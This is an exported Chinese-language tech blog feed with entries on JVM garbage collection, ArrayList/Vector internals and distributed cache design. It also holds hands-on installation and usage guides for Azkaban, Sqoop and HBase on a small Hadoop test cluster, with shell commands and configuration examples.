JVM 的垃圾收集器都是采用的分代回收算法，和之前所提到的算法并没有新的内容。 只是将 Java 堆分为了新生代和老年代。由于新生代中存活对象较少，所以采用复制算法，简单高效。 而老年代中对象较多，并且没有可以担保的内存区域，所以一般采用标记清除或者是标记整理算法。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArrayList]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FArrayList%2F</url>
    <content type="text"><![CDATA[ArrayList/Vector 的底层分析ArrayListArrayList 实现于 List、RandomAccess 接口。可以插入空数据，也支持随机访问。 ArrayList相当于动态数据，其中最重要的两个属性分别是:elementData 数组，以及 size 大小。在调用 add() 方法的时候：12345public boolean add(E e) &#123; ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125; 首先进行扩容校验。 将插入的值放到尾部，并将 size + 1 。 如果是调用 add(index,e) 在指定位置添加的话：12345678910public void add(int index, E element) &#123; rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!! //复制，向后移动 System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++;&#125; 也是首先扩容校验。 接着对数据进行复制，目的是把 index 位置空出来放本次插入的数据，并将后面的数据向后移动一个位置。 其实扩容最终调用的代码:1234567891011private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);&#125; 也是一个数组复制的过程。 由此可见 ArrayList 的主要消耗是数组扩容以及在指定位置添加数据，在日常使用时最好是指定大小，尽量减少扩容。更要减少在指定位置插入数据的操作。 序列化由于 ArrayList 是基于动态数组实现的，所以并不是所有的空间都被使用。因此使用了 transient 修饰，可以防止被自动序列化。 1transient Object[] elementData; 因此 ArrayList 自定义了序列化与反序列化： 1234567891011121314151617181920212223242526272829303132333435363738394041private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. //只序列化了被使用的数据 for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125;private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; elementData = EMPTY_ELEMENTDATA; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in capacity s.readInt(); // ignored if (size &gt; 0) &#123; // be like clone(), allocate array based upon size not capacity ensureCapacityInternal(size); Object[] a = elementData; // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; a[i] = s.readObject(); &#125; &#125;&#125; 当对象中自定义了 writeObject 和 readObject 方法时，JVM 会调用这两个自定义方法来实现序列化与反序列化。 从实现中可以看出 ArrayList 只序列化了被使用的数据。 VectorVoctor 也是实现于 List 接口，底层数据结构和 ArrayList 类似,也是一个动态数组存放数据。不过是在 add() 方法的时候使用 synchronize 进行同步写数据，但是开销较大，所以 Vector 是一个同步容器并不是一个并发容器。 以下是 add() 方法：123456public synchronized boolean add(E e) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;&#125; 以及指定位置插入数据:1234567891011121314public void add(int index, E element) &#123; insertElementAt(element, index);&#125;public synchronized void insertElementAt(E obj, int index) &#123; modCount++; if (index &gt; elementCount) &#123; throw new ArrayIndexOutOfBoundsException(index + " &gt; " + elementCount); &#125; ensureCapacityHelper(elementCount + 1); System.arraycopy(elementData, index, elementData, index + 1, elementCount - index); elementData[index] = obj; elementCount++;&#125;]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cache-design]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FCache-design%2F</url>
    <content type="text"><![CDATA[分布式缓存设计目前常见的缓存方案都是分层缓存，通常可以分为以下几层： NG 本地缓存，命中的话直接返回。 NG 没有命中时则需要查询分布式缓存，如 Redis 。 如果分布式缓存没有命中则需要回源到 Tomcat 在本地堆进行查询，命中之后异步写回 Redis 。 以上都没有命中那就只有从 DB 或者是数据源进行查询，并写回到 Redis 中。 缓存更新的原子性在写回 Redis 的时候如果是 Tomcat 集群，多个进程同时写那很有可能出现脏数据，这时就会出现更新原子性的问题。 可以有以下解决方案: 可以将多个 Tomcat 中的数据写入到 MQ 队列中，由消费者进行单线程更新缓存。 利用分布式锁，只有获取到锁进程才能写数据。 如何写缓存写缓存时也要注意，通常来说分为以下几步： 开启事物。 写入 DB 。 提交事物。 写入缓存。 这里可能会存在数据库写入成功但是缓存写入失败的情况，但是也不建议将写入缓存加入到事务中。因为写缓存的时候可能会因为网络原因耗时较长，这样会阻塞数据库事务。如果对一致性要求不高并且数据量也不大的情况下，可以单独起一个服务来做 DB 和缓存之间的数据同步操作。 更新缓存时也建议做增量更新。 负载策略缓存负载策略一般有以下两种： 轮询机制。 一致哈希算法。 轮询的优点是负载到各个服务器的请求是均匀的，但是如果进行扩容则缓存命中率会下降。 一致哈希的优点是相同的请求会负载到同一台服务器上，命中率不会随着扩容而降低，但是当大流量过来时有可能把服务器拖垮。 所以建议两种方案都采用：首先采用一致哈希算法，当流量达到一定的阈值的时候则切换为轮询，这样既能保证缓存命中率，也能提高系统的可用性。]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Azkaban]]></title>
    <url>%2F2018%2F06%2F29%2FHadoop%2F6-Sqoop%26Azkaban%2FAzkaban%2F</url>
    <content type="text"><![CDATA[1.出现契机应用场景举例: 1、通过 Hadoop 先将原始数据同步到 HDFS 上; 2、借助 MapReduce 计算框架对原始数据进行清洗转换，生成的数据以分区表的形式存储到 多张 Hive 表中; 3、需要对 Hive 中多个表的数据进行 Join 处理，得到一个明细数据 Hive 大表; 4、将明细数据进行各种统计分析，得到结果报表信息; 5、需要将统计分析得到的结果数据同步到业务系统中，供业务调用使用。 2.常见工作流调度系统 &amp; 对比在 Hadoop 领域，常见的工作流调度器有 Oozie，Azkaban，Cascading，Hamake 等 2.1.各种调度工具对比 2.2.Azkaban 与 Oozie 对比ooize 相比 azkaban 是一个重量级的任务调度系统，功能全面，但配置使用也更复杂。如果可以不 在意某些功能的缺失，轻量级调度器 azkaban 是很不错的候选对象。  工作流定义 Azkaban 使用 Properties 文件定义工作流 Oozie 使用 XML 文件定义工作流  定时执行 Azkaban 的定时执行任务是基于时间的 Oozie 的定时执行任务基于时间和输入数据 2.3.Azkaban 组件关系关系数据库(目前仅支持 MySQL) web 管理服务器-AzkabanWebServer 执行服务器-AzkabanExecutorServer Azkaban 使用 MySQL 来存储它的状态信息，Azkaban Executor Server 和 Azkaban Web Server 均使用到了 MySQL 数据库。 它有如下功能特点:  Web 用户界面  方便上传工作流  方便设置任务之间的关系  调度工作流  认证/授权(权限的工作)  能够杀死并重新启动工作流  模块化和可插拔的插件机制  项目工作区  工作流和任务的日志记录和审计 3.Azkaban 安装部署3.1准备工作Azkaban Web 服务器:azkaban-web-server-2.5.0.tar.gz Azkaban Excutor 执行服务器 :azkaban-executor-server-2.5.0.tar.gz Azkaban 初始化脚本文件:azkaban-sql-script-2.5.0.tar.gz 3.2安装说明将安装文件上传到集群,最好上传到安装hive、sqoop 的机器上,方便命令的执行。并最好同 一存放在 apps 目录下,用于存放源安装文件.新建 azkaban 目录,用于存放 azkaban 运行程序 3.3解压123tar -zxvf azkaban-web-server-2.5.0.tar.gz -C /home/apps/ap/azkaban/tar -zxvf azkaban-executor-server-2.5.0.tar.gz -C /home/apps/ap/azkaban/tar -zxvf azkaban-sql-script-2.5.0.tar.gz -C /home/apps/ap/azkaban/ 3.4进入 mysql 导入任务 job 表12345mysql&gt; create database azkaban; Query OK, 1 row affected (0.01 sec)mysql&gt; use azkaban; Database changedmysql&gt; source /home/hadoop/apps/azkaban/azkaban-script-2.5.0/create-all-sql-2.5.0.sql; 3.5创建 SSL 配置最好是在 azkaban 目录下执行: 123456789101112131415161718192021222324252627282930# 执行命令: keytool -keystore keystore -alias jetty -genkey -keyalg RSA# 运行此命令后,会提示输入当前生成 keystore 的密码及相应信息,输入密码请劳记,信息如下:Enter keystore password:Re-enter new password:What is your first and last name? [Unknown]:What is the name of your organizational unit? [Unknown]:What is the name of your organization? [Unknown]:What is the name of your City or Locality? [Unknown]:What is the name of your State or Province? [Unknown]:What is the two-letter country code for this unit? [Unknown]: CNIs CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=CN correct? [no]: yEnter key password for &lt;jetty&gt;(RETURN if same as keystore password):此时, 会发现目录下有一个 Keystore 文件------------------------------------------完成上述工作后,将在当前目录生成 keystore 证书文件,将 keystore 拷贝到 azkaban web 服务 器根目录中.如:cp keystore azkaban-web-2.5.0 3.6 修改配置文件注意: 配置文件后面一定不要有空格 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182831) 生成时区配置文件 Asia/Shanghai，用交互式命令 tzselect 即可, 如果有的话就不用再生成了 tzselect 2) 拷贝该时区文件，覆盖系统本地时区配置 sudo cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime3)  azkaban web 服务器配置 3.1)  配置 web 的 azkaban.properties  cd ~/apps/azkaban/azkaban-web-2.5.0/conf/ vi azkaban.properties 以下是需要修改的内容 #默认根 web 目录web.resource.dir=/home/ap/apps/azkaban/azkaban-web-2.5.0/web#默认时区,已改为亚洲/上海 默认为美国default.timezone.id=Asia/Shanghai#用户配置,具体配置参加下文user.manager.xml.file=/home/ap/apps/azkaban/azkaban-web-2.5.0/conf/azkaban-users.xml#global配置文件所在位置executor.global.properties=/home/ap/apps/azkaban/azkaban-executor-2.5.0/conf/global.properties#数据库相关配置mysql.host=cs2mysql.database=azkabanmysql.user=rootmysql.password=123#SSL 文件名jetty.keystore=/home/ap/apps/azkaban/azkaban-web-2.5.0/keystore#SSL 文件密码jetty.password=123456#Jetty 主密码 与 keystore 文件相同jetty.keypassword=123456#SSL 文件名jetty.truststore=/home/ap/apps/azkaban/azkaban-web-2.5.0/keystore# SSL 文件密码jetty.trustpassword=1234563.2) 配置 web 的 azkaban-users.xml # 增加 管理员用户vi azkaban-users.xml &lt;azkaban-users&gt; &lt;user username="azkaban" password="azkaban" roles="admin" groups="azkaban"/&gt; &lt;user username="metrics" password="metrics" roles="metrics"/&gt; # 此行是加的, 指用户名密码都为 admin &lt;user username="admin" password="admin" roles="admin,metrics"/&gt; &lt;role name="admin" permissions="ADMIN"/&gt; &lt;role name="metrics" permissions="METRICS"/&gt; &lt;/azkaban-users&gt; 4)  配置执行服务器 executor  cd apps/azkaban/azkaban-executor-2.5.0/conf/ vi azkaban.properties-----以下是需要修改的内容------#时区default.timezone.id=Asia/Shanghai # Azkaban JobTypes 插件配置，插件所在位置 azkaban.jobtype.plugin.dir=/home/hadoop/apps/azkaban/azkaban-executor-2.5.0/plugins/jobtypes#Loader for projectsexecutor.global.properties=/home/ap/apps/azkaban/azkaban-executor-2.5.0/conf/global.properties#mysql 需要修改的地方mysql.host=cs2mysql.database=azkabanmysql.user=rootmysql.password=1235) 配置环境变量 vi .zshrc # azkabanexport AZKABAN_WEB_HOME=/home/ap/apps/azkaban/azkaban-web-2.5.0export AZKABAN_EXE_HOME=/home/ap/apps/azkaban/azkaban-executor-2.5.0export PATH=$PATH:$AZKABAN_WEB_HOME/bin:$AZKABAN_EXE_HOME/bin 3.7 启动12345678910111213141516171819201)  启动 Azkaban Web Server: # ps: .out 是日志, 可以先创建 logs 目录, 日志地址随便# 前台启动azkaban-web-start.sh# 后台启动nohup azkaban-web-start.sh 1&gt;/home/ap/logs/azwebstd.out 2&gt;/home/ap/logs/azweberr.out &amp;2)  启动 Azkaban Executor: #前台启动azkaban-executor-start.sh# 后台启动nohup azkaban-executor-start.sh 1&gt;/home/ap/logs/azexstd.out 2&gt;/home/ap/logs/azexerr.out &amp;3)  登录 webUI https://cs2:8443/u: adminp: admin# 注意: 配置后面不能有空格!!! 4.Azkaban 实战演示见这里]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Azkaban</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Azkaban</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqoop]]></title>
    <url>%2F2018%2F06%2F28%2FHadoop%2F6-Sqoop%26Azkaban%2FSqoop%2F</url>
    <content type="text"><![CDATA[1. 作用 Sqoop 是 Apache 旗下一款“Hadoop 和关系数据库服务器之间传送数据”的工具。 导入数据：MySQL，Oracle 导入数据到 Hadoop 的 HDFS、HIVE、HBASE 等数据存储系统 导出数据：从 Hadoop 的文件系统中导出数据到关系数据库 MySQL 等 Sqoop 的本质还是一个命令行工具，和 HDFS，Hive 相比，并没有什么高深的理论。 2.工作机制将导入导出命令翻译成 MapReduce 程序来实现 在翻译出的 MapReduce 中主要是对 InputFormat 和 OutputFormat 进行定制 3.安装注意: 目录下要有hive, 因为要拿到 hive 的 home, 执行 hive 操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253541、 准备安装包 sqoop-1.4.6.bin_hadoop-2.0.4-alpha.tar.gz2、 解压安装包到安装目录tar -zxvf sqoop-1.4.6.bin_hadoop-2.0.4-alpha.tar.gz -C apps/ cd appsmv sqoop-1.4.6.bin_hadoop-2.0.4-alpha/ sqoop-1.4.63、 进入到 conf 文件夹，找到 sqoop-env-template.sh，修改其名称为 sqoop-env.sh cd confmv sqoop-env-template.sh sqoop-env.sh4、 修改 sqoop-env.sh-----export HADOOP_COMMON_HOME=/home/ap/apps/hadoop export HADOOP_MAPRED_HOME=/home/ap/apps/hadoop export HBASE_HOME=/home/ap/apps/hbaseexport HIVE_HOME=/home/ap/apps/hiveexport ZOOCFGDIR=/home/ap/apps/zookeeper/conf-----5、 加入 mysql 驱动包到 sqoop-1.4.6/lib 目录下cp mysql-connector-java-5.1.40-bin.jar ~/apps/sqoop-1.4.6/lib/6、 配置系统环境变量 vi ~/.bashrc然后输入:export SQOOP_HOME=/home/hadoop/apps/sqoop-1.4.6 export PATH=$PATH:$SQOOP_HOME/bin然后保存退出source ~/.bashrc7、 验证安装是否成功sqoop-version 或者 sqoopversionps : 吹出现警告, 不用管---[ap@cs2]~% sqoop versionWarning: /home/ap/apps/sqoop/../hcatalog does not exist! HCatalog jobs will fail.Please set $HCAT_HOME to the root of your HCatalog installation.Warning: /home/ap/apps/sqoop/../accumulo does not exist! Accumulo imports will fail.Please set $ACCUMULO_HOME to the root of your Accumulo installation.Warning: /home/ap/apps/sqoop/../zookeeper does not exist! Accumulo imports will fail.Please set $ZOOKEEPER_HOME to the root of your Zookeeper installation.18/06/28 20:43:52 INFO sqoop.Sqoop: Running Sqoop version: 1.4.6Sqoop 1.4.6git commit id c0c5a81723759fa575844a0a1eae8f510fa32c25Compiled by root on Mon Apr 27 14:38:36 CST 20158\  可以配置记住密码 但是好像不起作用???查看任务详细或者执行任务的时候不输入密码 免密[sqoop-site.xml]添加: &lt;property&gt; &lt;name&gt;sqoop.metastore.client.record.password&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;description&gt;If true, allow saved passwords in the metastore.&lt;/description&gt; &lt;/property&gt; 4. 基本使用121) sqoop help : 查看帮助2) sqoop help import : 进一步层级查看 5. Sqoop 数据导入常用指令12345678910--connect 指定数据库链接url--username 指定数据库的用户名--password 指定数据库的密码--table 指定要导出数据的mysql数据库表-m 指定MapTask的个数--target-dir 指定导出数据在HDFS上的存储目录--fields-terminated-by 指定每条记录中字段之间的分隔符--where 指定查询SQL的where条件--query 指定查询SQL--columns 指定查询列 5.1 list mysql 的数据库 &amp; 表, 复制mysql 中表结构相同表 –&gt; hive12345678910111213141516171819202122列出MySQL数据有哪些数据库：sqoop list-databases \--connect jdbc:mysql://cs2:3306/ \--username root \--password 123列出MySQL中的某个数据库有哪些数据表：sqoop list-tables \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123创建一张跟mysql中的help_keyword表一样的hive表hk：(没有数据貌似)sqoop create-hive-table \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--hive-table hk 5.2 导入 mysql中表 到 HDFS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081导入MySQL表中数据到HDFS中：// 普通导入：导入mysql库中的help_keyword的数据到HDFS上的默认路径：/user/ap/help_keywordsqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \-m 1最后的1,是指使用1个 mapTask 导入到hdfs后, 可以使用 hdfs dfs -text /.... 查看数据----// 导入： 指定分隔符 &amp; 导入路径 &amp; mapTask 个数sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--target-dir /user/ap/my_help_keyword1 \--fields-terminated-by '\t' \-m 3// 导入数据：带where条件sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--where "name='STRING' " \--table help_keyword \--target-dir /user/ap/my_help_keyword2 \-m 1// 查询指定列-------------发现一个结论, 如果启动3个 mapper, 但是最后只有一个结论, 只会生成一个结果文件sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--columns "name" \--where "name='STRING' " \--table help_keyword \--target-dir /user/ap/my_help_keyword3 \-m 3// 导入：指定自定义查询SQL--------------疑点: split-by 的作用, 和 -m 数量的关系sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--target-dir /user/ap/my_help_keyword4 \--query 'select help_keyword_id,name from help_keyword WHERE $CONDITIONS and name = "STRING"' \--split-by help_keyword_id \--fields-terminated-by '\t' \-m 1----------------------------sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--target-dir /user/hadoop/my_help_keyword5 \--query "select help_keyword_id,name from help_keyword WHERE \$CONDITIONS" \--split-by help_keyword_id \--fields-terminated-by '\t' \-m 1# 在以上需要按照自定义SQL语句导出数据到HDFS的情况下：1、引号问题，要么外层使用单引号，内层使用双引号，$CONDITIONS的$符号不用转义， 要么外层使用双引号，那么内层使用单引号，然后$CONDITIONS的$符号需要转义2、自定义的SQL语句中必须带有WHERE \$CONDITIONS 5.3 导入MySQL数据库中的表数据到Hive中：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051导入MySQL数据库中的表数据到Hive中：// 普通导入：数据存储在默认的default hive库中，表名就是对应的mysql的表名：// 通过对比发现, sqoop 是默认导入到 hdfs 的, 导入到hdfs时, 不用加额外的参数sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--hive-import \-m 1hadoop fs -cat /user/myhive/warehouse/help_keyword/part-m-00000 // 查看数据当然也可以在 hive 中查看数据// 指定行分隔符和列分隔符，指定hive-import，指定覆盖导入，指定自动创建hive表，指定表名，指定删除中间结果数据目录 Database does not exist: mydb_test ???注意: 要先创建 database mydb_test问题: 为什么导出后, 变成了4个块sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--fields-terminated-by "\t" \--lines-terminated-by "\n" \--hive-import \--hive-overwrite \--create-hive-table \--delete-target-dir \--hive-database mydb_test \--hive-table new_help_keyword另外一种写法：sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--fields-terminated-by "\t" \--lines-terminated-by "\n" \--hive-import \--hive-overwrite \--create-hive-table \--hive-table mydb_test.new_help_keyword1 \--delete-target-dir 5.4 增量导入到 HDFS—-应该也是可以导入到 Hive 12345678910111213141516171819202122232425262728第三部分：增量导入Incremental import arguments: --check-column &lt;column&gt; Source column to check for incremental change 原始的列作为增长改变的 --incremental &lt;import-type&gt; Define an incremental import of type 'append' or 'lastmodified' --last-value &lt;value&gt; Last imported value in the incremental check column比较使用于自增长主键!! // 增量导入sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--target-dir /user/ap/my_help_keyword_import1 \--incremental append \--check-column help_keyword_id \--last-value 500 \-m 3 5.5 第四部分： 导入数据到HBase1234567891011121314第四部分： 导入数据到HBase导入MySQL数据库中的表数据到HBase中：sqoop import \--connect jdbc:mysql://cs2:3306/mysql \--username root \--password 123 \--table help_keyword \--hbase-table new_help_keyword \--column-family person \--hbase-row-key help_keyword_id 5.6 导出12345678910111213141516171819202122232425262728293031323334353637第五部分：导出：注意：导出的RDBMS的表必须自己预先创建，不会自动创建------mysql-----先在 mysql 中创建库create database sqoopdb default character set utf8 COLLATE utf8_general_ci; use sqoopdb;CREATE TABLE sqoopstudent ( id INT NOT NULL PRIMARY KEY, name VARCHAR(20), sex VARCHAR(20), age INT,department VARCHAR(20));// 导出HDFS数据到MySQL：sqoop export \--connect jdbc:mysql://cs2:3306/sqoopdb \--username root \--password 123 \--table sqoopstudent \--export-dir /sqoopdata \--fields-terminated-by ','// 导出hive数据到MySQL：sqoop export \--connect jdbc:mysql://cs2:3306/sqoopdb \--username root \--password 123 \--table uv_info \--export-dir /user/hive/warehouse/uv/dt=2011-08-03 \--input-fields-terminated-by '\t' 5.6 导出HBase数据到MySQL很遗憾，现在还没有直接的命令将 HBase 的数据导出到 MySQL 一般采用如下 3 种方法: 1、将 HBase 数据，扁平化成 HDFS 文件，然后再由 sqoop 导入 2、将 HBase 数据导入 Hive 表中，然后再导入 MySQL 3、直接使用 HBase 的 Java API 读取表数据，直接向 MySQL 导入，不需要使用 sqoop 5.7 sqoop 支持 &amp; 不支持hdfs to mysql 可以直接使用。！！hive to mysql 就是hdfs to mysqlhbase to mysql 很不幸，不支持。！ 怎么实现？ 1、扁平化到HDFS 2、hbase和hive做整合 3、自己编写程序去实现从HBASE当中读取数据，然后写入到mYsql 6.Sqoop Job 作业查看帮助: sqoop help job 6.0 mysql 创建数据库 spider 和 表 lagou12# 这样可以直接导入 sql 数据source /home/ap/temp/lagou.sql 6.1 创建作业 Job (–create)123456789# 注意: mysql 中此时已经存在 spider 库, 库中有 lagou 表# ps: 导入表sqoop job --create my_sqoop_job \-- import \--connect jdbc:mysql://cs2:3306/spider \--username root \--password 123 \--table lagou 6.2 查看作业 Job (–list)1234sqoop job --list----------------------Available jobs: my_sqoop_job 6.3 查看作业详细信息 (–show)1sqoop job --show my_sqoop_job 6.4 执行作业1sqoop job --exec my_sqoop_job 6.5 删除作业1sqoop job --delete my_sqoop_job 7.Sqoop 导入导出原理7.1 导入原理 1、第一步，Sqoop 会通过 JDBC 来获取所需要的数据库元数据，例如，导入表的列名，数据 类型等。 2、第二步，这些数据库的数据类型(varchar, number 等)会被映射成 Java 的数据类型(String, int 等)，根据这些信息，Sqoop 会生成一个与表名同名的类用来完成序列化工作，保存表中的 每一行记录。 3、第三步，Sqoop 启动 MapReducer 作业 4、第四步，启动的作业在 input 的过程中，会通过 JDBC 读取数据表中的内容，这时，会使 用 Sqoop 生成的类进行反序列化操作 5、第五步，最后将这些记录写到 HDFS 中，在写入到 HDFS 的过程中，同样会使用 Sqoop 生 成的类进行反序列化 7.2 导出原理 1、 第一步，sqoop 依然会通过 JDBC 访问关系型数据库，得到需要导出数据的元数据信息 2、 第二步，根据获取到的元数据的信息，sqoop 生成一个 Java 类，用来进行数据的传输载 体。该类必须实现序列化和反序列化 3、 第三步，启动 mapreduce 作业 4、 第四步，sqoop 利用生成的这个 java 类，并行的从 hdfs 中读取数据 5、 第五步，每个 map 作业都会根据读取到的导出表的元数据信息和读取到的数据，生成一 批 insert 语句，然后多个 map 作业会并行的向数据库 mysql 中插入数据 所以，数据是从 hdfs 中并行的进行读取，也是并行的进入写入，那并行的读取是依赖 hdfs 的性能，而并行的写入到 mysql 中，那就要依赖于 mysql 的写入性能嘞。 官网: 参考PDF:]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Sqoop</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Sqoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-HBase-1]]></title>
    <url>%2F2018%2F06%2F26%2FHadoop%2F5-HBase%2Fi-HBase-1%2F</url>
    <content type="text"><![CDATA[Hbase概念 hbase &amp; hdfs 关系图 hadoop数据库，分布式可伸缩大型数据存储。 用户对随机、实时读写数据。 十亿行 x 百万列。 版本化、非关系型数据库。 Feature Linear and modular scalability. //线性模块化扩展方式。 Strictly consistent reads and writes. //严格一致性读写 Automatic and configurable sharding of tables//自动可配置表切割 Automatic failover support between RegionServers.//区域服务器之间自动容在 Convenient base classes for backing Hadoop MapReduce jobs with Apache HBase tables. Easy to use Java API for client access.//java API Block cache and Bloom Filters for real-time queries//块缓存和布隆过滤器用于实时查询 Query predicate push down via server side Filters//通过服务器端过滤器实现查询预测 Thrift gateway and a REST-ful Web service that supports XML, Protobuf, and binary data encoding options Extensible jruby-based (JIRB) shell Support for exporting metrics via the Hadoop metrics subsystem to files or Ganglia; or via JMX //可视化 面向列数据库。 HBase要点 1) 它介于 NoSQL 和 RDBMS 之间，仅能通过主键(rowkey)和主键的 range 来检索数据 2) HBase 查询数据功能很简单，不支持 join 等复杂操作 3) 不支持复杂的事务，只支持行级事务(可通过 hive 支持来实现多表 join 等复杂操作)。 4) HBase 中支持的数据类型:byte 5) 主要用来存储结构化和半结构化的松散数据。 HBase 表特点 大:一个表可以有上十亿行，上百万列 面向列:面向列(族)的存储和权限控制，列(簇)独立检索。 稀疏:对于为空(null)的列，并不占用存储空间，因此，表可以设计的非常稀疏。 无模式:每行都有一个可排序的主键和任意多的列，列可以根据需要动态的增加，同一 张表中不同的行可以有截然不同的列 HBase 存储机制 面向列存储，table是按row排序。 底层是 跳表 &amp; 布隆过滤器 HBase 定位机制(三级坐标) 行rowkey 列族 &amp; 列column family &amp; column 时间戳timestamp版本 表 行 列 列族的关系 官网的关系图如下 其它版本 Table is a collection of rows.表是行的集合 Row is a collection of column families行是列族的集合 Column family is a collection of columns.列族是列的集合 Column is a collection of key value pairs.列是键值对的集合(列其实就是 key) RowKey, Column Family, TimeStamp, Cell 概念解释 RowKey 是用来检索记录的主键 rowkey 行键可以是任意字符串(最大长度是 64KB，实际应用中长度一般为 10-100bytes)，最好是 16。 每一个物理文件中都会存一个 rk:TODO ?? 在 HBase 内部，rowkey 保存为字节数组。HBase 会对表中的数据按照 rowkey 排序 (字典顺序) 设计 key 时，要充分排序存储这 个特性，将经常一起读取的行存储放到一起。(位置相关性) 注意：字典序对 int 排序的结果是1,10,100,11,12,13,14,15,16,17,18,19,2,20,21,…9,91,92,93,94,95,96,97,98,99。要保持整形的自然序，行键必须用 0 作左填充。 Column Family 列族是表的 Schema 的一部分(而列不是)，必须在使用表之前定义好，而且定义好了之后就不能更改。 HBase 表中的每个列，都归属与某个列簇。 列簇越多，在取一行数据时所要参与 IO、搜寻的文件就越多，所以，如果没有必要，不要 设置太多的列簇（最好就一个列簇） TimeStamp HBase 中通过 rowkey 和 columns 确定的为一个存储单元称为 cell。 每个 cell 都保存着同一份 数据的多个版本。 版本通过时间戳来索引。 每个 cell 中，不同版本的数据按照时间倒序排序，即最新的数据排在最前面。 hbase 提供了两种数据版 本回收方式: 保存数据的最后 n 个版本 保存最近一段时间内的版本(设置数据的生命周期 TTL)。 Cell 单元格 由{rowkey, column( = + ), version} 唯一确定的单元。 Cell 中的数据是没有类型的，全部是字节码形式存贮。 HBase 的HA搭建 选择安装的主机cs1~cs4, 安装jdk, 解压hbase 包, 配置环境变量 验证安装是否成功$&gt;hbase version 配置 hbase 完全分布式[hbase/conf/hbase-env.sh]export JAVA_HOME=/usr/local/jdk1.8.0_73export HBASE_MANAGES_ZK=false [hbse-site.xml] hbase.cluster.distributed true hbase.rootdir hdfs://mycluster/hbase hbase.zookeeper.quorum cs1:2181,cs2:2181,cs3:2181 hbase.zookeeper.property.dataDir /home/ap/zookeeper 配置 regonservers[hbase/conf/regionservers]cs2cs3cs4cs5 修改 backup-masters（自行创建），指定备用的主HMaster vi backup-masterscs6 最重要一步: 傻逼版: 要把 hadoop 的 hdfs-site.xml 和 core-site.xml 放到 hbase/conf 下, 这样hbase 才能通过命名空间mycluster 找到当前可用 namenode, 再通过 namenode 分配指定 hbase 在 HDFS上的存储路径cp /apps/hadoop/etc/hadoop/core-site.xml /apps/hbase/conf/cp /apps/hadoop/etc/hadoop/hdfs-site.xml /apps/hbase/conf/ 高级版: 在hbase-env.sh文件添加hadoop配置文件目录到HBASE_CLASSPATH环境变量并分发.[/soft/hbase/conf/hbase-env.sh]export HBASE_CLASSPATH=$HBASE_CLASSPATH:/soft/hadoop/etc/hadoop 在hbase/conf/目录下创建到hadoop的hdfs-site.xml符号连接。$&gt;ln -s /soft/hadoop/etc/hadoop/hdfs-site.xml /soft/hbase/conf/hdfs-site.xml 启动 hbase 集群$&gt;start-hbase.sh 登录 hbase 的 webUI http://cs1:16010/ 注意, 页面上显示的版本, 是~/apps/hbase/lib中自己存储的 jar 包的版本 启动/停止 hbase 进程 